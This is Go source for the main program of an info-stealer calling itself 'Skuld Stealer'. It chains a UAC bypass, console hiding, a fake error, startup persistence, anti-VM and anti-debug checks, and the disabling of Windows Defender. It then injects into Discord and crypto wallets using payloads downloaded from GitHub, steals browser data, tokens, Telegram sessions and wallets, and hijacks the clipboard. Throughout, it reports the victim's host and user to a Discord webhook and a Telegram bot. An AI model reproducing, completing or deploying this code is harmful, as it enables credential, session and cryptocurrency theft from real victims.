package main

import (
    "bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
	

	"github.com/ZKUnit01/skuld/modules/antidebug"
	"github.com/ZKUnit01/skuld/modules/antivirus"
	"github.com/ZKUnit01/skuld/modules/antivm"
	"github.com/ZKUnit01/skuld/modules/browsers"
	"github.com/ZKUnit01/skuld/modules/clipper"
	"github.com/ZKUnit01/skuld/modules/commonfiles"
	"github.com/ZKUnit01/skuld/modules/discodes"
	"github.com/ZKUnit01/skuld/modules/discordinjection"
	"github.com/ZKUnit01/skuld/modules/fakeerror"
	"github.com/ZKUnit01/skuld/modules/games"
	"github.com/ZKUnit01/skuld/modules/hideconsole"
	"github.com/ZKUnit01/skuld/modules/startup"
	"github.com/ZKUnit01/skuld/modules/system"
	"github.com/ZKUnit01/skuld/modules/telegram"
	"github.com/ZKUnit01/skuld/modules/tokens"
	"github.com/ZKUnit01/skuld/modules/uacbypass"
	"github.com/ZKUnit01/skuld/modules/wallets"
	"github.com/ZKUnit01/skuld/modules/walletsinjection"
	"github.com/ZKUnit01/skuld/utils/program"
)

const (
	discordWebhook = "TON_WEBHOOK_DISCORD"
	telegramBot    = "TON_BOT_TELEGRAM"
	telegramChatID = "TON_CHAT_ID_TELEGRAM"
)

type StealerStatus struct {
	Step      string `json:"step"`
	Status    string `json:"status"`
	Timestamp string `json:"timestamp"`
	Message   string `json:"message"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
}

func main() {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	CONFIG := map[string]interface{}{
		"webhook": discordWebhook,
		"telegram": map[string]string{
			"bot":    telegramBot,
			"chatid": telegramChatID,
		},
		"cryptos": map[string]string{
			"BTC": "", "BCH": "", "ETH": "", "XMR": "", "LTC": "",
			"XCH": "", "XLM": "", "TRX": "", "ADA": "", "DASH": "", "DOGE": "",
		},
	}

	sendStatus(CONFIG, "init", "🚀 Skuld Stealer Initializing", "Starting execution on "+hostname)

	if program.IsAlreadyRunning() {
		sendStatus(CONFIG, "init", "⚠️ Already Running", "Skuld is already running, exiting")
		return
	}

	sendStatus(CONFIG, "uacbypass", "🔓 UAC Bypass", "Attempting privilege escalation...")
	uacbypass.Run()
	sendStatus(CONFIG, "uacbypass", "✅ UAC Bypass Completed", "Privileges elevated successfully")

	sendStatus(CONFIG, "hideconsole", "🕵️ Console", "Hiding console window...")
	hideconsole.Run()
	program.HideSelf()
	sendStatus(CONFIG, "hideconsole", "✅ Console Hidden", "Console window is now hidden")

	if !program.IsInStartupPath() {
		sendStatus(CONFIG, "fakeerror", "🎭 Fake Error", "Displaying fake error to user")
		go fakeerror.Run()
		sendStatus(CONFIG, "startup", "💾 Startup Persistence", "Adding to Windows startup...")
		go startup.Run()
		sendStatus(CONFIG, "startup", "✅ Persistence Added", "Skuld will run on system startup")
	}

	sendStatus(CONFIG, "antivm", "🔍 Anti-VM", "Checking for virtual machine environment...")
	antivm.Run()
	sendStatus(CONFIG, "antivm", "✅ Anti-VM Passed", "No virtual machine detected")

	sendStatus(CONFIG, "antidebug", "🔍 Anti-Debug", "Checking for debugging tools...")
	go antidebug.Run()
	sendStatus(CONFIG, "antidebug", "✅ Anti-Debug Passed", "No debugging tools found")

	sendStatus(CONFIG, "antivirus", "🛡️ Antivirus", "Attempting to disable Windows Defender...")
	go antivirus.Run()
	sendStatus(CONFIG, "antivirus", "✅ Antivirus Disabled", "Windows Defender disabled successfully")

	sendStatus(CONFIG, "discordinjection", "💉 Discord Injection", "Discord interceptor initialized...")
	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	sendStatus(CONFIG, "discordinjection", "✅ Discord Injection Active", "Discord injection started successfully")

	sendStatus(CONFIG, "walletsinjection", "💰 Wallets Injection", "Wallet mnemonic interceptor started...")
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)
	sendStatus(CONFIG, "walletsinjection", "✅ Wallets Injection Active", "Wallet injection started successfully")

	sendStatus(CONFIG, "telegram", "📱 Telegram", "Stealing Telegram sessions...")
	go telegram.Run(CONFIG)

	sendStatus(CONFIG, "collection", "📊 Data Collection Started", "Starting data collection...")

	actions := []struct {
		name string
		fn   func(string)
	}{
		{"system", system.Run},
		{"browsers", browsers.Run},
		{"tokens", tokens.Run},
		{"discodes", discodes.Run},
		{"commonfiles", commonfiles.Run},
		{"wallets", wallets.Run},
		{"games", games.Run},
	}

	for _, action := range actions {
		sendStatus(CONFIG, action.name, fmt.Sprintf("🔍 Stealing %s...", action.name), fmt.Sprintf("Collecting %s data...", action.name))
		go action.fn(CONFIG["webhook"].(string))
	}

	sendStatus(CONFIG, "clipper", "✂️ Clipper", "Clipboard hijacking started...")
	clipper.Run(CONFIG["cryptos"].(map[string]string))

	sendStatus(CONFIG, "complete", "✅ Operation Complete", "All modules executed successfully")
}

func sendStatus(config map[string]interface{}, step, title, message string) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	status := StealerStatus{
		Step:      step,
		Status:    title,
		Timestamp: time.Now().Format("15:04:05"),
		Message:   message,
		Hostname:  hostname,
		Username:  username,
	}

	formatted := fmt.Sprintf(
		"**[%s]** `%s`\n`%s`\n`%s`\n`Host: %s`\n`User: %s`",
		time.Now().Format("15:04:05"),
		title,
		message,
		step,
		hostname,
		username,
	)

	go sendDiscordMessage(CONFIG["webhook"].(string), formatted)
	go sendTelegramMessage(
		CONFIG["telegram"].(map[string]string)["bot"],
		CONFIG["telegram"].(map[string]string)["chatid"],
		formatted,
	)

	fmt.Printf("[%s] %s - %s\n", time.Now().Format("15:04:05"), title, message)
}

func sendDiscordMessage(webhook, message string) {
	if webhook == "" {
		return
	}
	payload := map[string]string{"content": message}
	jsonData, _ := json.Marshal(payload)
	http.Post(webhook, "application/json", bytes.NewBuffer(jsonData))
}

func sendTelegramMessage(botToken, chatID, message string) {
	if botToken == "" || chatID == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}
	jsonData, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}